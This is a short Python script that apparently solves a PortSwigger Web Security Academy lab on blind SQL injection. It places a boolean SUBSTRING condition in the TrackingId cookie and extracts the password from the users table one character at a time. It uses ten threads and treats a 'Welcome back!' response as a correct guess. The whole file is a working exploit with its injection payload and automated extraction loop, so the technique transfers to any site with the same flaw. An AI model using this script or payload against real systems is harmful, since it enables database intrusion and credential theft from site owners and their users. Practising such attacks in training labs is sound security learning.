import requests
from requests.exceptions import ConnectionError
from threading import Thread
from time import sleep

session = requests.session()

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:'\",.<>/?"
burp0_url = "https://0a1000d80315e052809a30d9008b0040.web-security-academy.net"
password_length = 20

retrieved = {}
index = 1
char_index = 0
threads_num = 10
is_sleep_required = False
seconds = 5


def send_request(char):
    global retrieved
    global index
    global char_index

    print("[*] Trying: ", char)

    burp0_cookies = {
        "TrackingId": f"8aDl61yF5ni070js' and '{char}'=SUBSTRING((select password from users limit 1),{index},1) --",
        "session": "3tmUwgJLKexumkeA0T99UsQDo7dmim9e",
    }

    try:
        response = session.get(burp0_url, cookies=burp0_cookies)
    except ConnectionError:
        is_sleep_required = True
    else:
        is_sleep_required = False

        if b"Welcome back!" in response.content:
            retrieved[index] = char
            index += 1
            char_index = 0
            print("[+] Found: ", char)


def send_multiple_request():
    global char_index
    global threads_num

    threads = []

    for i in range(char_index, min(char_index + threads_num, len(chars))):
        threads.append(Thread(target=send_request, args=(chars[i],)))

    char_index += threads_num

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


while index <= password_length:
    send_multiple_request()

    if is_sleep_required:
        print(f"[!] Hit the max retries, trying again after {seconds} seconds")
        sleep(seconds)
        char_index -= threads_num
        continue

print("Retrieved: ", "".join(retrieved.values()))
